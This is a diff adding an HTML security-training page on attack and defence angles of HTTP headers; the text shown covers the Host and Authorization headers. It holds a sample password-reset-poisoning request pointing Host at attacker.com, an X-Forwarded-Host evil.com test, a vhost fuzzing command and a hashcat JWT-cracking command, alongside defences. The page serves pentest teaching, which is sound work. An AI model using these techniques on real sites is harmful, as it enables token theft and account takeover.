@@ -1,0 +1,2560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phase 1 — HTTP Headers Deep Dive</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #05070a;
+  --surface: #090d12;
+  --card: #0e1419;
+  --card2: #121a22;
+  --border: #1a2636;
+  --border2: #243346;
+  --green: #39d98a;
+  --green-dim: rgba(57,217,138,0.1);
+  --red: #ff5757;
+  --red-dim: rgba(255,87,87,0.1);
+  --amber: #ffb347;
+  --amber-dim: rgba(255,179,71,0.1);
+  --blue: #4db8ff;
+  --blue-dim: rgba(77,184,255,0.1);
+  --purple: #b08cff;
+  --purple-dim: rgba(176,140,255,0.1);
+  --cyan: #00e5cc;
+  --text: #c8d6e5;
+  --muted: #4a6070;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Syne', sans-serif;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.75;
+  overflow-x: hidden;
+}
+
+/* SCAN LINE EFFECT */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ── SIDEBAR NAV ── */
+.sidebar {
+  position: fixed;
+  left: 0; top: 0; bottom: 0;
+  width: 260px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  z-index: 100;
+  display: flex;
+  flex-direction: column;
+}
+
+.sidebar::-webkit-scrollbar { width: 3px; }
+.sidebar::-webkit-scrollbar-track { background: transparent; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border2); }
+
+.sidebar-header {
+  padding: 24px 20px 16px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.sidebar-badge {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--green);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.sidebar-title {
+  font-size: 15px;
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.3;
+}
+
+.nav-section {
+  padding: 12px 0 4px;
+}
+
+.nav-section-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--muted);
+  padding: 0 20px;
+  margin-bottom: 4px;
+}
+
+.nav-item {
+  display: block;
+  padding: 7px 20px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  text-decoration: none;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+  cursor: pointer;
+}
+
+.nav-item:hover {
+  color: var(--text);
+  background: rgba(255,255,255,0.03);
+  border-left-color: var(--border2);
+}
+
+.nav-item.active {
+  color: var(--green);
+  background: var(--green-dim);
+  border-left-color: var(--green);
+}
+
+.nav-item .sev {
+  float: right;
+  font-size: 8px;
+  padding: 1px 5px;
+  border-radius: 2px;
+  margin-top: 1px;
+}
+
+.sev-crit { background: rgba(255,87,87,0.2); color: var(--red); }
+.sev-high { background: rgba(255,179,71,0.2); color: var(--amber); }
+.sev-med  { background: rgba(77,184,255,0.2); color: var(--blue); }
+.sev-low  { background: rgba(74,96,112,0.3); color: var(--muted); }
+
+/* ── MAIN CONTENT ── */
+.main {
+  margin-left: 260px;
+  min-height: 100vh;
+}
+
+/* HERO */
+.hero {
+  padding: 60px 60px 48px;
+  background: linear-gradient(135deg, #070d14 0%, #0a1520 50%, #050a10 100%);
+  border-bottom: 1px solid var(--border);
+  position: relative;
+  overflow: hidden;
+}
+
+.hero::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  right: -10%;
+  width: 600px;
+  height: 600px;
+  background: radial-gradient(circle, rgba(57,217,138,0.04) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: 4px;
+  color: var(--green);
+  text-transform: uppercase;
+  margin-bottom: 18px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.hero-eyebrow::before {
+  content: '';
+  display: inline-block;
+  width: 24px;
+  height: 1px;
+  background: var(--green);
+}
+
+.hero h1 {
+  font-size: clamp(32px, 4vw, 54px);
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.1;
+  margin-bottom: 20px;
+}
+
+.hero h1 em { color: var(--green); font-style: normal; }
+
+.hero-desc {
+  max-width: 680px;
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.8;
+  margin-bottom: 32px;
+}
+
+.hero-stats {
+  display: flex;
+  gap: 32px;
+  flex-wrap: wrap;
+}
+
+.stat {
+  text-align: center;
+}
+
+.stat-num {
+  font-family: var(--mono);
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--green);
+  display: block;
+  line-height: 1;
+}
+
+.stat-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-top: 4px;
+}
+
+/* ── CONTENT AREA ── */
+.content {
+  padding: 0 60px 80px;
+}
+
+/* SECTION */
+.section {
+  margin-top: 64px;
+}
+
+.section-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 20px;
+  margin-bottom: 32px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.section-icon {
+  width: 48px;
+  height: 48px;
+  border: 1px solid var(--border2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  flex-shrink: 0;
+  background: var(--card);
+}
+
+.section-meta { flex: 1; }
+
+.section-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+
+.section-title {
+  font-size: 24px;
+  font-weight: 800;
+  color: #fff;
+}
+
+.section-subtitle {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--muted);
+  margin-top: 4px;
+}
+
+/* ── HEADER CARD ── */
+.header-card {
+  border: 1px solid var(--border);
+  background: var(--card);
+  margin-bottom: 16px;
+  position: relative;
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+
+.header-card:hover {
+  border-color: var(--border2);
+}
+
+.header-card::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  width: 3px;
+}
+
+.severity-critical .header-card::before,
+.hc-critical::before { background: var(--red); }
+.severity-high .header-card::before,
+.hc-high::before { background: var(--amber); }
+.severity-medium .header-card::before,
+.hc-medium::before { background: var(--blue); }
+.severity-low .header-card::before,
+.hc-low::before { background: var(--muted); }
+.severity-info .header-card::before,
+.hc-info::before { background: var(--purple); }
+
+.hc-header {
+  padding: 18px 20px 16px 24px;
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  cursor: pointer;
+  user-select: none;
+}
+
+.hc-name {
+  font-family: var(--mono);
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--cyan);
+  flex: 1;
+}
+
+.hc-name .direction {
+  font-size: 9px;
+  font-weight: 400;
+  color: var(--muted);
+  margin-left: 10px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+.hc-badges {
+  display: flex;
+  gap: 6px;
+  align-items: center;
+  flex-shrink: 0;
+  flex-wrap: wrap;
+  justify-content: flex-end;
+}
+
+.badge {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 1px;
+  padding: 3px 8px;
+  text-transform: uppercase;
+  border: 1px solid;
+}
+
+.badge-critical { border-color: rgba(255,87,87,0.4); color: var(--red); background: var(--red-dim); }
+.badge-high { border-color: rgba(255,179,71,0.4); color: var(--amber); background: var(--amber-dim); }
+.badge-medium { border-color: rgba(77,184,255,0.4); color: var(--blue); background: var(--blue-dim); }
+.badge-low { border-color: rgba(74,96,112,0.4); color: var(--muted); background: rgba(74,96,112,0.1); }
+.badge-info { border-color: rgba(176,140,255,0.4); color: var(--purple); background: var(--purple-dim); }
+.badge-defense { border-color: rgba(57,217,138,0.4); color: var(--green); background: var(--green-dim); }
+
+.hc-toggle {
+  font-family: var(--mono);
+  font-size: 14px;
+  color: var(--muted);
+  transition: transform 0.2s, color 0.2s;
+  margin-top: 2px;
+  flex-shrink: 0;
+}
+
+.header-card.open .hc-toggle {
+  transform: rotate(45deg);
+  color: var(--green);
+}
+
+.hc-brief {
+  padding: 0 24px 16px 24px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--muted);
+  border-top: 1px dashed rgba(255,255,255,0.05);
+  padding-top: 12px;
+  display: none;
+}
+
+.header-card.open .hc-brief { display: none; }
+
+.hc-body {
+  display: none;
+  border-top: 1px solid var(--border);
+}
+
+.header-card.open .hc-body { display: block; }
+
+/* ── BODY GRID ── */
+.body-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 0;
+}
+
+.body-col {
+  padding: 24px;
+  border-right: 1px solid var(--border);
+}
+
+.body-col:last-child { border-right: none; }
+
+.body-col-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  margin-bottom: 14px;
+  padding-bottom: 8px;
+  border-bottom: 1px dashed var(--border);
+}
+
+.col-explain .body-col-title { color: var(--blue); }
+.col-attack .body-col-title { color: var(--red); }
+.col-defense .body-col-title { color: var(--green); }
+.col-example .body-col-title { color: var(--amber); }
+
+.body-col p {
+  font-size: 13.5px;
+  color: var(--text);
+  margin-bottom: 12px;
+  line-height: 1.7;
+}
+
+.body-col ul {
+  list-style: none;
+  margin-bottom: 12px;
+}
+
+.body-col ul li {
+  font-size: 13px;
+  color: var(--text);
+  padding: 5px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+  padding-left: 16px;
+  position: relative;
+}
+
+.body-col ul li::before {
+  content: '▸';
+  position: absolute;
+  left: 0;
+  color: var(--muted);
+  font-size: 10px;
+  top: 7px;
+}
+
+.col-attack ul li::before { color: var(--red); }
+.col-defense ul li::before { color: var(--green); }
+
+/* CODE BLOCK */
+.code-block {
+  background: rgba(0,0,0,0.5);
+  border: 1px solid var(--border2);
+  padding: 14px 16px;
+  font-family: var(--mono);
+  font-size: 11.5px;
+  line-height: 1.7;
+  overflow-x: auto;
+  margin: 10px 0;
+  position: relative;
+}
+
+.code-block .comment { color: var(--muted); }
+.code-block .header-name { color: var(--cyan); }
+.code-block .header-value { color: var(--amber); }
+.code-block .attack { color: var(--red); }
+.code-block .keyword { color: var(--purple); }
+.code-block .good { color: var(--green); }
+.code-block .bad { color: var(--red); }
+
+.code-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 6px;
+  margin-top: 14px;
+}
+
+/* FULL WIDTH BODY COL */
+.body-col-full {
+  padding: 24px;
+  border-top: 1px solid var(--border);
+}
+
+.body-col-full .body-col-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  margin-bottom: 14px;
+  padding-bottom: 8px;
+  border-bottom: 1px dashed var(--border);
+}
+
+/* 3 COL GRID */
+.body-grid-3 {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 0;
+}
+
+/* ATTACK SCENARIO */
+.attack-scenario {
+  background: rgba(255,87,87,0.04);
+  border: 1px solid rgba(255,87,87,0.15);
+  padding: 16px 18px;
+  margin: 12px 0;
+}
+
+.attack-scenario-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--red);
+  margin-bottom: 10px;
+}
+
+.attack-scenario p {
+  font-size: 13px;
+  color: #ffb3b3;
+  margin: 0;
+}
+
+/* DEFENSE BOX */
+.defense-box {
+  background: rgba(57,217,138,0.04);
+  border: 1px solid rgba(57,217,138,0.15);
+  padding: 16px 18px;
+  margin: 12px 0;
+}
+
+.defense-box-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--green);
+  margin-bottom: 10px;
+}
+
+.defense-box p {
+  font-size: 13px;
+  color: #9eecc4;
+  margin: 0;
+}
+
+/* DIVIDER */
+.section-divider {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin: 56px 0 40px;
+}
+
+.section-divider-line { flex: 1; height: 1px; background: var(--border); }
+.section-divider-text {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 4px;
+  text-transform: uppercase;
+  color: var(--muted);
+  white-space: nowrap;
+}
+
+/* INLINE CODE */
+code {
+  font-family: var(--mono);
+  font-size: 12px;
+  background: rgba(77,184,255,0.1);
+  color: var(--blue);
+  padding: 1px 6px;
+}
+
+code.red { background: var(--red-dim); color: var(--red); }
+code.green { background: var(--green-dim); color: var(--green); }
+code.amber { background: var(--amber-dim); color: var(--amber); }
+
+/* INFO BOX */
+.info-box {
+  background: var(--blue-dim);
+  border-left: 3px solid var(--blue);
+  padding: 14px 18px;
+  margin: 12px 0;
+  font-size: 13px;
+  color: #b0d8f5;
+}
+
+.warn-box {
+  background: var(--amber-dim);
+  border-left: 3px solid var(--amber);
+  padding: 14px 18px;
+  margin: 12px 0;
+  font-size: 13px;
+  color: #f5d9a0;
+}
+
+.warn-box strong, .info-box strong {
+  font-weight: 700;
+  display: block;
+  margin-bottom: 4px;
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+/* TABLE */
+.mini-table { width: 100%; border-collapse: collapse; font-size: 12px; margin: 10px 0; }
+.mini-table th {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--muted);
+  padding: 8px 12px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+  background: rgba(0,0,0,0.3);
+}
+.mini-table td {
+  padding: 8px 12px;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+  vertical-align: top;
+}
+.mini-table tr:hover td { background: rgba(255,255,255,0.02); }
+.mini-table td:first-child { font-family: var(--mono); color: var(--cyan); font-size: 11px; }
+
+/* PROGRESS BAR */
+.progress-wrap {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 6px;
+}
+.progress-label { font-family: var(--mono); font-size: 11px; color: var(--text); min-width: 160px; }
+.progress-bar { flex: 1; height: 4px; background: var(--border2); }
+.progress-fill { height: 100%; }
+.fill-critical { background: var(--red); }
+.fill-high { background: var(--amber); }
+.fill-medium { background: var(--blue); }
+.fill-low { background: var(--muted); }
+
+/* STICKY PROGRESS */
+.sticky-bar {
+  position: sticky;
+  top: 0;
+  background: rgba(5,7,10,0.95);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 60px;
+  z-index: 50;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  backdrop-filter: blur(10px);
+}
+
+.sticky-progress {
+  flex: 1;
+  height: 2px;
+  background: var(--border);
+}
+
+.sticky-progress-fill {
+  height: 100%;
+  background: var(--green);
+  width: 0%;
+  transition: width 0.3s;
+}
+
+.sticky-text {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  white-space: nowrap;
+}
+
+/* COOKIE ATTR TABLE */
+.attr-row {
+  display: grid;
+  grid-template-columns: 140px 1fr 1fr;
+  gap: 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 13px;
+}
+.attr-row:last-child { border-bottom: none; }
+.attr-row > div { padding: 12px 16px; }
+.attr-row > div:not(:last-child) { border-right: 1px solid var(--border); }
+.attr-row.header { background: rgba(0,0,0,0.4); }
+.attr-row.header > div { font-family: var(--mono); font-size: 9px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); }
+.attr-name { font-family: var(--mono); font-size: 12px; color: var(--cyan); }
+
+/* MOBILE */
+@media(max-width: 900px) {
+  .sidebar { display: none; }
+  .main { margin-left: 0; }
+  .hero, .content { padding-left: 24px; padding-right: 24px; }
+  .body-grid, .body-grid-3 { grid-template-columns: 1fr; }
+  .body-col { border-right: none; border-bottom: 1px solid var(--border); }
+  .sticky-bar { padding: 10px 24px; }
+}
+
+/* PULSE ANIM */
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.4; }
+}
+
+.live-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse 2s ease infinite;
+  flex-shrink: 0;
+}
+
+/* EXPAND ALL BUTTON */
+.controls {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 24px;
+  flex-wrap: wrap;
+}
+
+.ctrl-btn {
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 8px 16px;
+  border: 1px solid var(--border2);
+  background: var(--card);
+  color: var(--text);
+  cursor: pointer;
+  transition: all 0.15s;
+  letter-spacing: 1px;
+}
+
+.ctrl-btn:hover {
+  border-color: var(--green);
+  color: var(--green);
+  background: var(--green-dim);
+}
+
+.filter-btn { }
+.filter-btn.active {
+  border-color: var(--red);
+  color: var(--red);
+  background: var(--red-dim);
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-badge">Phase 1 · Module 1</div>
+    <div class="sidebar-title">HTTP Headers<br>Security Deep Dive</div>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-label">Request Headers</div>
+    <a class="nav-item" onclick="scrollTo('host')">Host <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('user-agent')">User-Agent <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('authorization')">Authorization <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('cookie')">Cookie <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('referer')">Referer <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('origin')">Origin <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('content-type')">Content-Type <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('content-length')">Content-Length <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('transfer-encoding')">Transfer-Encoding <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('xff')">X-Forwarded-For <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('x-forwarded-host')">X-Forwarded-Host <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('accept')">Accept <span class="sev sev-low">LOW</span></a>
+    <a class="nav-item" onclick="scrollTo('accept-encoding')">Accept-Encoding <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('cache-control-req')">Cache-Control (Req) <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('x-method-override')">X-HTTP-Method-Override <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('sec-fetch')">Sec-Fetch-* <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('upgrade')">Upgrade <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('forwarded')">Forwarded <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('range')">Range <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('if-modified')">If-Modified-Since <span class="sev sev-low">LOW</span></a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-label">Response Headers</div>
+    <a class="nav-item" onclick="scrollTo('csp')">Content-Security-Policy <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('hsts')">Strict-Transport-Security <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('xfo')">X-Frame-Options <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('xcto')">X-Content-Type-Options <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('set-cookie')">Set-Cookie <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('cors-acao')">Access-Control-Allow-Origin <span class="sev sev-crit">CRIT</span></a>
+    <a class="nav-item" onclick="scrollTo('referrer-policy')">Referrer-Policy <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('permissions-policy')">Permissions-Policy <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('server')">Server / X-Powered-By <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('cache-control-res')">Cache-Control (Res) <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('location')">Location <span class="sev sev-high">HIGH</span></a>
+    <a class="nav-item" onclick="scrollTo('coop')">COOP/COEP/CORP <span class="sev sev-med">MED</span></a>
+    <a class="nav-item" onclick="scrollTo('xxp')">X-XSS-Protection <span class="sev sev-low">LOW</span></a>
+    <a class="nav-item" onclick="scrollTo('expect-ct')">Expect-CT <span class="sev sev-low">LOW</span></a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-label">Deep Dives</div>
+    <a class="nav-item" onclick="scrollTo('cookie-attrs')">🍪 Cookie Attributes</a>
+    <a class="nav-item" onclick="scrollTo('csp-deep')">🛡 CSP Directive Reference</a>
+    <a class="nav-item" onclick="scrollTo('cors-deep')">🌐 CORS Full Flow</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div class="main">
+
+  <!-- STICKY -->
+  <div class="sticky-bar">
+    <div class="live-dot"></div>
+    <span class="sticky-text" id="sticky-label">Phase 1 · HTTP Headers Security</span>
+    <div class="sticky-progress"><div class="sticky-progress-fill" id="prog-fill"></div></div>
+    <span class="sticky-text" id="prog-pct">0%</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-eyebrow">Phase 1 · Module 1 · HTTP Headers</div>
+    <h1>Every HTTP Header<br><em>Security Angle</em> In Depth</h1>
+    <div class="hero-desc">
+      Headers are the nervous system of HTTP. Every attack — from XSS to request smuggling to SSRF — either uses a header as an attack vector or is prevented by a security header. Know every single one cold.
+    </div>
+    <div class="hero-stats">
+      <div class="stat"><span class="stat-num">20+</span><span class="stat-label">Request Headers</span></div>
+      <div class="stat"><span class="stat-num">15+</span><span class="stat-label">Response Headers</span></div>
+      <div class="stat"><span class="stat-num">10</span><span class="stat-label">Cookie Attributes</span></div>
+      <div class="stat"><span class="stat-num">30+</span><span class="stat-num" style="font-size:14px;color:var(--red)">Attack Vectors</span></div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- CONTROLS -->
+    <div class="section" style="margin-top:40px;">
+      <div class="controls">
+        <button class="ctrl-btn" onclick="expandAll()">⊞ Expand All</button>
+        <button class="ctrl-btn" onclick="collapseAll()">⊟ Collapse All</button>
+        <button class="ctrl-btn filter-btn" onclick="filterSeverity('critical')" id="filt-crit">🔴 Critical Only</button>
+        <button class="ctrl-btn filter-btn" onclick="filterSeverity('high')" id="filt-high">🟡 High Only</button>
+        <button class="ctrl-btn" onclick="filterSeverity('all')">⬜ Show All</button>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════
+         REQUEST HEADERS
+    ══════════════════════════════════════ -->
+    <div class="section" id="request-headers">
+      <div class="section-header">
+        <div class="section-icon">→</div>
+        <div class="section-meta">
+          <div class="section-label">Part 1 of 2</div>
+          <div class="section-title">HTTP Request Headers</div>
+          <div class="section-subtitle">Headers sent FROM the client TO the server — primary attack surface</div>
+        </div>
+      </div>
+
+      <!-- HOST -->
+      <div class="header-card hc-critical open" id="host" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Host <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">Password Reset Poison</span>
+            <span class="badge badge-info">Cache Poison</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>The <code>Host</code> header specifies the domain name of the server being requested. It is <strong>mandatory in HTTP/1.1</strong>. It tells the web server which virtual host (vhost) to serve — a single IP can host thousands of domains, and this header decides which one responds.</p>
+              <div class="code-block">
+<span class="comment"># Example HTTP/1.1 request</span>
+<span class="header-name">GET</span> <span class="header-value">/reset-password?token=abc123</span> HTTP/1.1
+<span class="header-name">Host:</span> <span class="header-value">bank.com</span>
+<span class="header-name">Cookie:</span> <span class="header-value">session=xyz</span>
+              </div>
+              <p>The server uses this to route requests, generate links in emails, and build absolute URLs. This is exactly where the danger lies.</p>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Password Reset Poisoning</div>
+                <p>Change the Host header to your server. The app builds a reset link using Host → victim gets an email with link pointing to <em>your</em> server → you steal the reset token.</p>
+              </div>
+              <div class="code-block">
+<span class="comment"># Attacker sends this to /forgot-password</span>
+<span class="header-name">POST</span> /forgot-password HTTP/1.1
+<span class="header-name">Host:</span> <span class="attack">attacker.com</span>
+<span class="comment"># App generates:
+# "Click here: https://attacker.com/reset?token=SECRET"
+# Victim clicks → you get the token</span>
+              </div>
+              <ul>
+                <li><strong>Web cache poisoning</strong> — inject Host to poison cached responses with your URL</li>
+                <li><strong>SSRF via Host</strong> — some apps make backend requests using the Host value</li>
+                <li><strong>Virtual host brute forcing</strong> — fuzzing Host to discover hidden vhosts</li>
+                <li><strong>X-Forwarded-Host bypass</strong> — if Host is filtered, try this alternate</li>
+                <li><strong>Routing bypass</strong> — accessing internal services by forging Host</li>
+              </ul>
+            </div>
+          </div>
+          <div class="body-grid">
+            <div class="body-col col-defense">
+              <div class="body-col-title">Defense / Detection</div>
+              <ul>
+                <li>Whitelist allowed Host values server-side</li>
+                <li>Never use Host header to construct URLs in emails or redirects</li>
+                <li>Use a hardcoded base URL from server config instead</li>
+                <li>Burp: Try modifying Host to your Collaborator URL on password reset</li>
+              </ul>
+            </div>
+            <div class="body-col col-example">
+              <div class="body-col-title">Pentest Checklist</div>
+              <ul>
+                <li>Test password reset with Host: burpcollaborator.net</li>
+                <li>Add X-Forwarded-Host: evil.com alongside real Host</li>
+                <li>Fuzz vhosts with ffuf -H "Host: FUZZ.target.com"</li>
+                <li>Check if 400 vs 200 reveals internal routing info</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- AUTHORIZATION -->
+      <div class="header-card hc-critical" id="authorization" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Authorization <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">Bearer Tokens</span>
+            <span class="badge badge-info">Basic Auth</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Carries credentials to authenticate the client with the server. Three main schemes you'll encounter:</p>
+              <div class="code-block">
+<span class="comment"># Basic Auth — base64(username:password)</span>
+<span class="header-name">Authorization:</span> <span class="header-value">Basic dXNlcjpwYXNz</span>
+
+<span class="comment"># Bearer Token (JWT or OAuth)</span>
+<span class="header-name">Authorization:</span> <span class="header-value">Bearer eyJhbGciOiJIUzI1NiJ9...</span>
+
+<span class="comment"># Digest Auth</span>
+<span class="header-name">Authorization:</span> <span class="header-value">Digest username="user", realm="..."</span>
+
+<span class="comment"># API Key (non-standard but common)</span>
+<span class="header-name">Authorization:</span> <span class="header-value">ApiKey sk_live_abc123...</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>Basic Auth decode</strong> — base64 is NOT encryption. Decode immediately → plaintext creds</li>
+                <li><strong>JWT attacks</strong> — alg:none, RS256→HS256, weak secret brute-force</li>
+                <li><strong>Token replay</strong> — stealing Bearer tokens and replaying them</li>
+                <li><strong>Token in URL</strong> — if token leaks into Referer or logs</li>
+                <li><strong>Missing auth</strong> — remove this header entirely — does endpoint still respond?</li>
+                <li><strong>Privilege escalation</strong> — swap your JWT sub/role claim with another user's</li>
+              </ul>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Missing Authorization Check</div>
+                <p>Delete the entire Authorization header from the request. If the API still returns data — you found a broken auth vulnerability. Always try this.</p>
+              </div>
+            </div>
+          </div>
+          <div class="body-grid">
+            <div class="body-col col-defense">
+              <div class="body-col-title">Defense</div>
+              <ul>
+                <li>Never use Basic Auth on non-TLS connections</li>
+                <li>JWT: use RS256 with proper key validation, not HS256 with weak secret</li>
+                <li>Short token expiry (15 min for access tokens)</li>
+                <li>Validate tokens server-side on EVERY request</li>
+              </ul>
+            </div>
+            <div class="body-col col-example">
+              <div class="body-col-title">Pentest Steps</div>
+              <ul>
+                <li>Decode Basic Auth: <code>echo "dXNlcjpwYXNz" | base64 -d</code></li>
+                <li>Try removing header → check if still works</li>
+                <li>Replace JWT with none algorithm variant</li>
+                <li>Brute JWT secret: <code>hashcat -a 0 -m 16500 token.txt wordlist</code></li>
+              </ul>
+            </div>
+          </div>
+        </div>
